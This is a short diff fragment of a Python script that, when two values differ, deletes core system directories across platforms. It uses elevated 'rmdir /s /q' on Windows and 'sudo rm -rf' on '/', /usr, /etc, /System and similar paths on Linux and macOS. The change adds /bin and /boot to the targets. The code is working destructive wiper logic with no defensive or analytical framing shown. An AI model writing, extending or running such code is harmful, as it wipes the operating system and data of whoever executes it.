@@ -16,12 +16,12 @@ if (x != y):
             subprocess.run(["powershell","-Command",f'Start-Process cmd -ArgumentList \'/c rmdir /s /q "{i}"\' -Verb RunAs'], check=False)
         
     elif (system == "Linux"):
-        paths = ["/","/usr/bin","/usr/lib","/lib","/etc","/lib/modules",]
+        paths = ["/","/usr/bin","/usr/lib","/lib","/etc","/lib/modules","/bin","/boot",]
         for i in paths:
             subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)
 
     elif system == "Darwin":
-        paths = ["/","/usr/bin","/usr/lib","/etc","/System/Library","/System",]
+        paths = ["/","/usr/bin","/usr/lib","/etc","/System/Library","/System","/bin",]
         for i in paths:
             subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)
 
